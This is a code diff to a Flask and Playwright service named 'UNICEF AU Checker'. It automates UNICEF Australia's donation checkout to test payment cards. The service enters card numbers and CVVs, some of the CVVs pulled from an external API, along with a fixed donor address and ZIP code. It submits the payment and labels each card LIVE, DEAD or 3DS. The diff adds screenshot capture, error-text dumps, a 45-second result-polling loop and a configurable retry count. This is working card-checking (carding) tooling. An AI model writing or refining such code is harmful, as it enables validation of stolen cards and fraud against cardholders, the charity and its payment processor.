@@ -30,8 +30,8 @@ DONOR_ADDRESS    = os.environ.get(
     '233 Kurrajong Rd, Prestons NSW 2170, Australia'
 )
 
-# ZIP code (necesario porque Northflank corre en USA)
 ZIP_CODE = os.environ.get('ZIP_CODE', '10001')
+MAX_RETRIES_PER_CARD = int(os.environ.get('MAX_RETRIES_PER_CARD', '1'))  # default 1 = sin reintento
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -117,6 +117,29 @@ class UnicefChecker:
             logger.error(f"Error API CVV: {e}")
             return None
 
+    def _screenshot(self, tag):
+        """Toma screenshot con nombre único y devuelve base64 (opcional)."""
+        try:
+            if self.page:
+                path = f'debug_psicodelia_{tag}.png'
+                self.page.screenshot(path=path, full_page=True)
+                logger.info(f"📸 Screenshot guardado: {path}")
+                return path
+        except Exception as e:
+            logger.warning(f"Screenshot {tag} falló: {e}")
+        return None
+
+    def _screenshot_b64(self):
+        """Devuelve screenshot en base64."""
+        try:
+            if self.page:
+                return base64.b64encode(
+                    self.page.screenshot(full_page=True)
+                ).decode('utf-8')
+        except Exception:
+            pass
+        return None
+
     def _click_first_visible(self, page, selector, timeout=15, desc=""):
         deadline = time.time() + timeout
         while time.time() < deadline:
@@ -164,7 +187,6 @@ class UnicefChecker:
     # ZIP CODE (necesario porque el server corre en USA)
     # ============================================================
     def _fill_zip_code(self, ctx, verbose=False):
-        """Rellena el ZIP code si aparece (Stripe lo pide por geolocalización)."""
         selectors = [
             '#payment-postalInput',
             'input[name="postal"]',
@@ -174,7 +196,6 @@ class UnicefChecker:
             'input[autocomplete="postal-code"]',
             'input[placeholder*="ZIP" i]',
             'input[placeholder*="Postal" i]',
-            'input[placeholder*="Código postal" i]',
             'input[aria-label*="ZIP" i]',
             'input[aria-label*="Postal" i]',
         ]
@@ -182,26 +203,21 @@ class UnicefChecker:
             try:
                 loc = ctx.locator(sel).first
                 if loc.count() > 0 and loc.is_visible():
-                    # Verificar si ya está lleno correctamente
                     try:
                         current = loc.input_value()
                     except Exception:
                         current = ''
                     if current == ZIP_CODE:
                         if verbose:
-                            logger.info(f"📮 ZIP ya estaba lleno: {ZIP_CODE}")
+                            logger.info(f"📮 ZIP ya estaba: {ZIP_CODE}")
                         return True
-                    loc.click(timeout=3000)
-                    time.sleep(0.15)
+                    loc.click(timeout=3000); time.sleep(0.1)
                     try:
                         loc.fill('')
                     except Exception:
-                        # En algunos inputs readonly, forzar con teclado
-                        loc.press('Control+A')
-                        loc.press('Delete')
+                        loc.press('Control+A'); loc.press('Delete')
                     time.sleep(0.1)
-                    loc.fill(ZIP_CODE)
-                    time.sleep(0.3)
+                    loc.fill(ZIP_CODE); time.sleep(0.3)
                     try:
                         loc.evaluate("""el => {
                             el.dispatchEvent(new Event('input',  {bubbles:true}));
@@ -210,45 +226,13 @@ class UnicefChecker:
                         }""")
                     except Exception:
                         pass
-                    logger.info(f"📮 ZIP rellenado con {ZIP_CODE} vía {sel}")
+                    if verbose:
+                        logger.info(f"📮 ZIP rellenado con {ZIP_CODE} vía {sel}")
                     return True
             except Exception:
                 continue
         if verbose:
-            logger.info("ℹ️ No se encontró campo ZIP code (probablemente no requerido)")
-        return False
-
-    def _has_zip_error(self, ctx):
-        """Detecta si hay un error rojo tipo 'Your ZIP code is invalid'."""
-        try:
-            for sel in [
-                '[aria-invalid="true"]',
-                '[class*="FieldError"]',
-                '[class*="error" i]',
-            ]:
-                loc = ctx.locator(sel)
-                n = loc.count()
-                for i in range(min(n, 10)):
-                    try:
-                        el = loc.nth(i)
-                        if el.is_visible():
-                            txt = el.inner_text().strip().lower() if el.inner_text else ''
-                            if 'zip' in txt or 'postal' in txt:
-                                return True
-                    except Exception:
-                        pass
-            # Chequear atributo aria-invalid en el input de postal
-            for sel in ['#payment-postalInput', 'input[name="postal"]',
-                        'input[autocomplete="postal-code"]']:
-                try:
-                    loc = ctx.locator(sel).first
-                    if loc.count() > 0:
-                        if loc.get_attribute('aria-invalid') == 'true':
-                            return True
-                except Exception:
-                    pass
-        except Exception:
-            pass
+            logger.info("ℹ️ No se encontró campo ZIP")
         return False
 
     # ---------------- pasos del flow ----------------
@@ -543,12 +527,10 @@ class UnicefChecker:
         cvc.click(); time.sleep(0.2)
         cvc.fill(card_info['cvv']); time.sleep(0.6)
 
-        # 🔥 ZIP CODE (Stripe lo pide porque el server está en USA)
         zip_ok = self._fill_zip_code(ctx, verbose=True)
 
         try:
-            cvc.press('Tab')
-            time.sleep(1.0)
+            cvc.press('Tab'); time.sleep(1.0)
         except Exception:
             pass
 
@@ -624,21 +606,52 @@ class UnicefChecker:
         error_sel = (
             '[role="alert"], [aria-live="polite"], [aria-live="assertive"], '
             '[class*="ErrorText" i], [class*="error-message" i], '
-            '[class*="FieldError" i], [class*="ErrorMessage" i]'
+            '[class*="FieldError" i], [class*="ErrorMessage" i], '
+            '[class*="PaymentError" i], [class*="payment-error" i], '
+            '[class*="Alert" i], [class*="Notification" i], '
+            '.p-FieldError, .p-Input-Error, .p-FieldError-ErrorText'
         )
         for c in [self.page] + list(self.page.frames):
             try:
                 n = c.locator(error_sel).count()
                 for i in range(min(n, 15)):
                     try:
-                        t = c.locator(error_sel).nth(i).inner_text().strip()
-                        if t:
-                            snapshot.add(t.lower()[:300])
+                        el = c.locator(error_sel).nth(i)
+                        if el.is_visible():
+                            t = el.inner_text().strip()
+                            if t:
+                                snapshot.add(t.lower()[:300])
                     except Exception:
                         pass
             except Exception:
                 pass
         return snapshot
+
+    def _dump_error_texts(self):
+        """Devuelve lista de errores visibles (para log)."""
+        errors = []
+        error_sel = (
+            '[role="alert"], [aria-live="polite"], [aria-live="assertive"], '
+            '[class*="ErrorText" i], [class*="error-message" i], '
+            '[class*="FieldError" i], [class*="ErrorMessage" i], '
+            '[class*="PaymentError" i], [class*="payment-error" i], '
+            '.p-FieldError, .p-Input-Error, .p-FieldError-ErrorText'
+        )
+        for c in [self.page] + list(self.page.frames):
+            try:
+                n = c.locator(error_sel).count()
+                for i in range(min(n, 20)):
+                    try:
+                        el = c.locator(error_sel).nth(i)
+                        if el.is_visible():
+                            t = el.inner_text().strip()
+                            if t and len(t) > 2:
+                                errors.append(t[:200])
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+        return errors
 
     def _get_btn_text(self, span):
         try:
@@ -682,11 +695,10 @@ class UnicefChecker:
             'unable to process', 'error de pago', 'pago fall',
         )
         for item in new_items:
-            # Ignorar errores de ZIP (no son decline real, son validación local)
-            if 'zip' in item or 'postal' in item:
+            if 'zip' in item or 'postal' in item or 'postcode' in item:
                 continue
             if any(k in item for k in dead_kw):
-                logger.info(f"🆕 Error NUEVO: '{item[:100]}'")
+                logger.info(f"🆕 Error NUEVO: '{item[:150]}'")
                 return True
         return False
 
@@ -700,101 +712,27 @@ class UnicefChecker:
             pass
         return False
 
-    def _button_in_processing(self, curr_text, curr_disabled, pre_text, pre_disabled):
-        if pre_text and 'process payment' in pre_text:
-            if curr_text and 'process payment' not in curr_text:
-                return True
-        if not pre_disabled and curr_disabled:
-            return True
-        if curr_text == '' and pre_text != '':
-            return True
-        return False
-
-    def _wait_for_final_result(self, span=None, max_seconds=45):
-        start = time.time()
-        for i in range(max_seconds):
-            time.sleep(1)
-            outcome = self.analyze_payment_result(self.page)
-            if outcome in ('decline', 'live', 'threeds'):
-                logger.info(f"📊 Resultado final tras ~{int(time.time()-start)}s: {outcome}")
-                return outcome
-            if i > 6 and span is not None:
-                try:
-                    if span.count() > 0 and span.is_visible():
-                        txt = span.inner_text().strip().lower()
-                        if 'process payment' in txt:
-                            logger.info(f"ℹ️ Botón re-habilitado → decline silencioso (~{int(time.time()-start)}s)")
-                            return 'decline'
-                except Exception:
-                    pass
-        return 'unknown'
-
-    def _wait_for_button_ready(self, span, timeout=20, ctx=None):
-        """Espera que el botón esté enabled. Re-rellena ZIP si sigue deshabilitado."""
-        start = time.time()
-        zip_retry_done = False
-        for _ in range(timeout * 2):
-            try:
-                if span is not None and span.count() > 0 and span.is_visible():
-                    txt = span.inner_text().strip().lower()
-                    if 'process payment' in txt:
-                        if not self._get_btn_disabled(span):
-                            return True
-                        # Botón deshabilitado → probablemente ZIP requerido
-                        if not zip_retry_done and ctx is not None and (time.time() - start) > 3:
-                            logger.info("🔧 Botón disabled >3s → reintentando ZIP")
-                            self._fill_zip_code(ctx, verbose=False)
-                            zip_retry_done = True
-            except Exception:
-                pass
-            time.sleep(0.5)
-        return False
-
     def _mouse_click_locator(self, locator):
         try:
+            try:
+                locator.scroll_into_view_if_needed(timeout=3000)
+                time.sleep(0.3)
+            except Exception:
+                pass
             box = locator.bounding_box()
             if box and box['width'] > 0 and box['height'] > 0:
                 x = box['x'] + box['width'] / 2
                 y = box['y'] + box['height'] / 2
-                self.page.mouse.move(x, y)
-                time.sleep(0.15)
+                logger.info(f"      mouse.click({x:.0f},{y:.0f})")
+                self.page.mouse.move(x, y); time.sleep(0.2)
                 self.page.mouse.click(x, y)
                 return True
-        except Exception:
-            pass
+        except Exception as e:
+            logger.info(f"      mouse.click falló: {e}")
         return False
 
-    def _dispatch_pointer_click(self, span):
-        try:
-            return span.evaluate("""el => {
-                function findClickable(node) {
-                    if (!node) return null;
-                    if (node.tagName === 'BUTTON') return node;
-                    if (node.getAttribute && node.getAttribute('role') === 'button') return node;
-                    return findClickable(node.parentElement);
-                }
-                const t = findClickable(el) || el;
-                const box = t.getBoundingClientRect();
-                const x = box.left + box.width/2;
-                const y = box.top + box.height/2;
-                const peOpts = {bubbles:true, cancelable:true, view:window,
-                                clientX:x, clientY:y, button:0, buttons:1};
-                const meOpts = {bubbles:true, cancelable:true, view:window,
-                                clientX:x, clientY:y, button:0};
-                if (window.PointerEvent) {
-                    t.dispatchEvent(new PointerEvent('pointerdown', peOpts));
-                    t.dispatchEvent(new PointerEvent('pointerup', peOpts));
-                }
-                t.dispatchEvent(new MouseEvent('mousedown', meOpts));
-                t.dispatchEvent(new MouseEvent('mouseup', meOpts));
-                t.dispatchEvent(new MouseEvent('click', meOpts));
-                return true;
-            }""")
-        except Exception:
-            return None
-
     # ============================================================
-    # CLICK — 02_btn_click_normal HARDCODEADO COMO PRINCIPAL
+    # CLICK — polling robusto con captura obligatoria
     # ============================================================
     def _click_process_payment_and_wait(self):
         found_ctx, span, btn = self._locate_process_payment()
@@ -806,22 +744,28 @@ class UnicefChecker:
             btn = span
         target = btn if btn is not None else span
 
-        # 🔥 Antes de esperar, asegurar ZIP si el botón está disabled
-        ctx_for_zip = self._find_card_context()
-        if ctx_for_zip is not None and self._get_btn_disabled(span):
-            logger.info("🔧 Botón deshabilitado → re-llenando ZIP")
-            self._fill_zip_code(ctx_for_zip, verbose=False)
+        # ---- Loguear errores preexistentes ----
+        pre_errs = self._dump_error_texts()
+        if pre_errs:
+            logger.info(f"⚠️ Errores PREEXISTENTES ({len(pre_errs)}):")
+            for i, e in enumerate(pre_errs[:10]):
+                logger.info(f"   {i+1}. {e[:180]}")
+        else:
+            logger.info("✅ Sin errores preexistentes en el DOM")
 
-        if span is not None:
-            if not self._wait_for_button_ready(span, timeout=20, ctx=ctx_for_zip):
-                logger.warning("⚠️ Botón no 'ready' en 20s — chequeando ZIP error")
-                if ctx_for_zip is not None and self._has_zip_error(ctx_for_zip):
-                    logger.info("🔧 Error de ZIP detectado → re-llenando")
-                    self._fill_zip_code(ctx_for_zip, verbose=False)
-                    time.sleep(1)
-                    self._wait_for_button_ready(span, timeout=10, ctx=ctx_for_zip)
-                else:
-                    logger.warning("⚠️ Continuamos igual")
+        # ---- Pre-outcome para saber si la página ya está en decline ----
+        pre_outcome = self.analyze_payment_result(self.page)
+        logger.info(f"🔍 Pre-outcome: '{pre_outcome}'")
+
+        # ---- Screenshot ANTES ----
+        self._screenshot("01_before_click")
+
+        # ---- ZIP si botón disabled ----
+        ctx_for_zip = self._find_card_context()
+        if self._get_btn_disabled(span) and ctx_for_zip:
+            logger.info("🔧 Botón disabled → re-llenando ZIP")
+            self._fill_zip_code(ctx_for_zip, verbose=True)
+            time.sleep(1)
 
         pre_errors = self._snapshot_errors()
         pre_btn_text = self._get_btn_text(span)
@@ -829,86 +773,99 @@ class UnicefChecker:
         logger.info(f"🔍 [SNAPSHOT] pre_text='{pre_btn_text}' pre_disabled={pre_btn_disabled} "
                     f"pre_errors={len(pre_errors)}")
 
-        attempts = [
-            ("02_btn_click_normal",
-                lambda: btn.click(timeout=8000) if btn is not None else None, 12),
-            ("01_btn_click_force",
-                lambda: btn.click(force=True, timeout=8000) if btn is not None else None, 12),
-            ("03_mouse_click_bbox",
-                lambda: self._mouse_click_locator(target), 8),
-            ("04_span_click_force",
-                lambda: span.click(force=True, timeout=5000) if span is not None else None, 8),
-            ("05_span_click_normal",
-                lambda: span.click(timeout=5000) if span is not None else None, 8),
-            ("06_span_eval_click",
-                lambda: span.evaluate("el => el.click()") if span is not None else None, 8),
-            ("07_parent_eval_click",
-                lambda: span.evaluate(
-                    "el => (el.closest('button') || el.parentElement).click()"
-                ) if span is not None else None, 8),
-            ("08_dispatch_mouse",
-                lambda: span.evaluate("""el => {
-                    const t = el.closest('button') || el.parentElement || el;
-                    ['mousedown','mouseup','click'].forEach(ev => {
-                        t.dispatchEvent(new MouseEvent(ev, {
-                            bubbles:true, cancelable:true, view:window
-                        }));
-                    });
-                }""") if span is not None else None, 8),
-            ("09_dispatch_pointer",
-                lambda: self._dispatch_pointer_click(span) if span is not None else None, 8),
-            ("10_focus_enter",
-                lambda: (target.focus(), time.sleep(0.2),
-                         self.page.keyboard.press('Enter')) if target is not None else None, 8),
-        ]
-
-        for name, action, wait_secs in attempts:
-            logger.info(f"   ▶️  [{name}] (esperando hasta {wait_secs}s)")
-
-            # 🔥 Antes de CADA intento, verificar si ZIP necesita re-llenarse
-            if ctx_for_zip is not None and self._has_zip_error(ctx_for_zip):
-                logger.info("   🔧 ZIP error detectado antes del intento → re-llenando")
-                self._fill_zip_code(ctx_for_zip, verbose=False)
-                time.sleep(0.5)
-
+        # ---- CLICK PRINCIPAL ----
+        logger.info("🖱️  CLICK principal: mouse_click_bbox")
+        clicked = False
+        try:
+            clicked = self._mouse_click_locator(target)
+        except Exception as e:
+            logger.warning(f"Mouse click falló: {e}")
+        if not clicked and btn is not None:
             try:
-                action()
+                btn.click(force=True, timeout=5000)
+                clicked = True
+                logger.info("🖱️  Fallback: btn.click(force=True)")
             except Exception as e:
-                logger.info(f"   ❌ [{name}] ex: {str(e)[:100]}")
-                continue
+                logger.warning(f"btn.click falló: {e}")
 
-            detected = None
-            ticks = int(wait_secs * 2)
-            tick = 0
-            for tick in range(ticks):
-                time.sleep(0.5)
-                if self._check_new_decline(pre_errors):
-                    detected = 'decline'
-                    break
-                if self._check_live():
-                    detected = 'live'
-                    break
-                curr_text = self._get_btn_text(span)
-                curr_disabled = self._get_btn_disabled(span)
-                if self._button_in_processing(curr_text, curr_disabled,
-                                              pre_btn_text, pre_btn_disabled):
-                    detected = 'processing'
-                    break
+        if not clicked:
+            logger.error("❌ No se pudo ejecutar el click")
+            self._screenshot("02_click_failed")
+            return 'unknown'
 
-            if detected == 'decline':
-                logger.info(f"   ✅ [{name}] → DECLINE tras {(tick+1)*0.5:.1f}s")
-                return 'decline'
-            if detected == 'live':
-                logger.info(f"   ✅ [{name}] → LIVE")
-                return 'live'
-            if detected == 'processing':
-                logger.info(f"   ✅ [{name}] → PROCESSING tras {(tick+1)*0.5:.1f}s")
-                return self._wait_for_final_result(span)
+        time.sleep(2)
+        self._screenshot("03_after_click_2s")
 
-            logger.info(f"   ⚠️  [{name}] sin señal tras {wait_secs}s")
+        # ---- POLLING 45s ----
+        logger.info("⏳ Polling resultado (45s max)...")
+        start = time.time()
+        detected = None
+        for i in range(90):  # 45s a 0.5s
+            time.sleep(0.5)
+            elapsed = int(time.time() - start)
 
-        self._dump_debug()
-        return 'unknown'
+            # 1) Error nuevo
+            if self._check_new_decline(pre_errors):
+                detected = 'decline'
+                logger.info(f"📊 [{elapsed}s] decline (error nuevo)")
+                break
+
+            # 2) analyze_payment_result (si cambió respecto al pre_outcome)
+            curr_outcome = self.analyze_payment_result(self.page)
+            if curr_outcome in ('decline', 'live', 'threeds') and curr_outcome != pre_outcome:
+                detected = curr_outcome
+                logger.info(f"📊 [{elapsed}s] {curr_outcome} (analyze)")
+                break
+
+            # 3) URL live
+            if self._check_live():
+                detected = 'live'
+                logger.info(f"📊 [{elapsed}s] live (URL)")
+                break
+
+            # 4) Botón cambió → sigue esperando con más tiempo
+            curr_text = self._get_btn_text(span)
+            curr_disabled = self._get_btn_disabled(span)
+            if (curr_text and 'process payment' not in curr_text) or \
+               (not pre_btn_disabled and curr_disabled) or \
+               (curr_text == '' and pre_btn_text != ''):
+                logger.info(f"📊 [{elapsed}s] botón cambió ('{curr_text}' disabled={curr_disabled}) "
+                            f"→ sigue polling con más tiempo")
+                # No break, seguir esperando resultado real
+
+            # 5) ZIP retry cada 4s
+            if ctx_for_zip and i > 0 and i % 8 == 0:
+                try:
+                    self._fill_zip_code(ctx_for_zip, verbose=False)
+                except Exception:
+                    pass
+
+            # 6) Log progreso cada 6s
+            if elapsed > 0 and elapsed % 6 == 0 and i % 12 == 0:
+                logger.info(f"⏳ [{elapsed}s] esperando... url={self.page.url[:60]}")
+
+        # ---- RESULTADO ----
+        if not detected:
+            logger.warning(f"❌ Sin resultado tras 45s → unknown")
+            self._screenshot("99_unknown_final")
+
+            # Captura final + dump
+            post_errs = self._dump_error_texts()
+            if post_errs:
+                logger.warning(f"⚠️ Errores visibles al final ({len(post_errs)}):")
+                for i, e in enumerate(post_errs[:10]):
+                    logger.warning(f"   {i+1}. {e[:180]}")
+
+            post_outcome = self.analyze_payment_result(self.page)
+            logger.warning(f"⚠️ Post-outcome final: '{post_outcome}'")
+            logger.warning(f"⚠️ URL final: {self.page.url}")
+
+            self._dump_debug()
+            return 'unknown'
+
+        logger.info(f"✅ Resultado detectado: {detected}")
+        self._screenshot(f"04_result_{detected}")
+        return detected
 
     def _dump_debug(self):
         logger.warning("════════════ DEBUG DUMP ════════════")
@@ -917,9 +874,7 @@ class UnicefChecker:
                 url = getattr(c, 'url', 'unknown')[:100]
                 spans = c.locator('#button-text').all()
                 buttons = c.locator('button').all()
-                has_proc = c.locator(':text("Process Payment")').count()
-                # ¿ZIP?
-                zip_sel = c.locator('#payment-postalInput, input[name="postal"], input[autocomplete="postal-code"]')
+                zip_sel = c.locator('#payment-postalInput, input[name="postal"], input[name="postalCode"], input[autocomplete="postal-code"]')
                 zip_count = zip_sel.count()
                 zip_val = ''
                 if zip_count > 0:
@@ -928,8 +883,7 @@ class UnicefChecker:
                     except Exception:
                         pass
                 logger.warning(f"[ctx {i}] url={url} | #button-text={len(spans)} | "
-                               f"buttons={len(buttons)} | 'Process Payment' matches={has_proc} | "
-                               f"zip_count={zip_count} zip_val='{zip_val}'")
+                               f"buttons={len(buttons)} | zip_count={zip_count} zip_val='{zip_val}'")
                 for j, s in enumerate(spans[:3]):
                     try:
                         t = s.inner_text().strip()[:40]
@@ -938,14 +892,6 @@ class UnicefChecker:
                         logger.warning(f"    span[{j}]: text='{t}' visible={v} bbox={bb}")
                     except Exception as e:
                         logger.warning(f"    span[{j}]: err {e}")
-                for j, b in enumerate(buttons[:5]):
-                    try:
-                        t = b.inner_text().strip()[:40].replace('\n', ' ')
-                        v = b.is_visible()
-                        dis = b.get_attribute('disabled')
-                        logger.warning(f"    btn[{j}]: text='{t}' visible={v} disabled={dis}")
-                    except Exception:
-                        pass
             except Exception as e:
                 logger.warning(f"[ctx {i}] err: {e}")
         logger.warning("════════════════════════════════════")
@@ -969,7 +915,7 @@ class UnicefChecker:
             logger.info(f"✅ CVV vía API: {api_cvv}")
             card_info['cvv'] = api_cvv
 
-        max_attempts = 3
+        max_attempts = MAX_RETRIES_PER_CARD
         for attempt in range(max_attempts):
             if attempt > 0:
                 logger.info(f"🔄 Reintento {attempt}/{max_attempts-1} de ****{card_last4}")
@@ -1001,34 +947,32 @@ class UnicefChecker:
 
             outcome = self._click_process_payment_and_wait()
 
+            # Tomar screenshot base64 SIEMPRE (incluso unknown)
+            screenshot_b64 = self._screenshot_b64()
+
             if outcome == 'live':
                 self._teardown_session()
-                return self._build_result(card_last4, 'LIVE', amount, api_cvv, outcome)
+                return self._build_result(card_last4, 'LIVE', amount, api_cvv, outcome, screenshot_b64)
             if outcome == 'decline':
                 logger.info(f"✅ DECLINE — sesión se mantiene")
-                return self._build_result(card_last4, 'DEAD', amount, api_cvv, outcome)
+                return self._build_result(card_last4, 'DEAD', amount, api_cvv, outcome, screenshot_b64)
             if outcome == 'threeds':
                 self._teardown_session()
-                return self._build_result(card_last4, '3DS', amount, api_cvv, outcome)
+                return self._build_result(card_last4, '3DS', amount, api_cvv, outcome, screenshot_b64)
 
-            logger.warning(f"⚠️ Unknown en intento {attempt+1}")
+            logger.warning(f"⚠️ Unknown en intento {attempt+1} — retornando con captura")
             self._teardown_session()
+            return self._build_result(card_last4, 'ERROR', amount, api_cvv, outcome, screenshot_b64)
 
         return {'success': False, 'status': 'ERROR',
-                'message': 'Unknown outcome tras reintentos',
+                'message': 'Unknown outcome',
                 'card': f"****{card_last4}"}
 
-    def _build_result(self, last4, status, amount, api_cvv, raw_outcome):
-        screenshot_b64 = None
-        try:
-            if self.page:
-                screenshot_b64 = base64.b64encode(
-                    self.page.screenshot(full_page=True)
-                ).decode('utf-8')
-        except Exception:
-            pass
+    def _build_result(self, last4, status, amount, api_cvv, raw_outcome, screenshot_b64=None):
+        if screenshot_b64 is None:
+            screenshot_b64 = self._screenshot_b64()
         return {
-            'success': True, 'status': status,
+            'success': status != 'ERROR', 'status': status,
             'original_status': f"Resultado: {raw_outcome}",
             'message': f"Análisis completado para ****{last4}",
             'card': f"****{last4}",
@@ -1209,8 +1153,8 @@ def process_cards_worker(cards, amount, stop_on_live):
 @app.route('/')
 def index():
     return jsonify({
-        "status": "online", "service": "UNICEF AU Checker", "version": "2.4",
-        "mode": "persistent_session + auto_zip_code",
+        "status": "online", "service": "UNICEF AU Checker", "version": "2.5",
+        "mode": "persistent_session + auto_zip + screenshot_on_unknown",
         "endpoints": {
             "health": "/api/health", "status": "/api/status",
             "check_card": "/api/check-card (POST)",
@@ -1220,6 +1164,7 @@ def index():
         "config": {
             "headless": HEADLESS, "donation_amount": DONATION_AMOUNT,
             "cvv_api": bool(CVV_API_URL), "zip_code": ZIP_CODE,
+            "max_retries_per_card": MAX_RETRIES_PER_CARD,
         },
     })
 
@@ -1227,7 +1172,7 @@ def index():
 @app.route('/api/health', methods=['GET'])
 def health_check():
     return jsonify({'status': 'online', 'service': 'UNICEF AU Checker',
-                    'version': '2.4', 'timestamp': datetime.now().isoformat()})
+                    'version': '2.5', 'timestamp': datetime.now().isoformat()})
 
 
 @app.route('/api/status', methods=['GET'])
@@ -1301,5 +1246,6 @@ def cancel_check():
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
     debug = os.environ.get('FLASK_ENV', 'development') == 'development'
-    logger.info(f"🚀 Puerto {port} (headless={HEADLESS}, amount=${DONATION_AMOUNT}, zip=${ZIP_CODE}) — v2.4 auto ZIP")
+    logger.info(f"🚀 Puerto {port} (headless={HEADLESS}, amount=${DONATION_AMOUNT}, "
+                f"zip=${ZIP_CODE}, retries={MAX_RETRIES_PER_CARD}) — v2.5 debug ON")
     app.run(host='0.0.0.0', port=port, debug=debug, use_reloader=False)
